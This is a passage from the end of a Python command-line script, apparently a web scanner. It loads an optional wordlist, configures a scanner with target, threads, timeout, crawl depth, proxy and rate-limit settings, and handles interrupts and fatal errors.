    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
    
    args = parser.parse_args()
    
    # Load wordlist if provided
    wordlist = DEFAULT_WORDLIST
    if args.wordlist and os.path.exists(args.wordlist):
        with open(args.wordlist, 'r') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    
    # Initialize and run scanner
    scanner = Scanner(
        target=args.target,
        wordlist=wordlist,
        threads=args.threads,
        timeout=args.timeout,
        output_dir=args.output,
        crawl_depth=args.depth,
        proxy=args.proxy,
        rate_limit=args.rate,
        verify_ssl=args.verify_ssl
    )
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user. Generating reports...")
        scanner.log("Scan interrupted by user", "info")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}")
        sys.exit(1)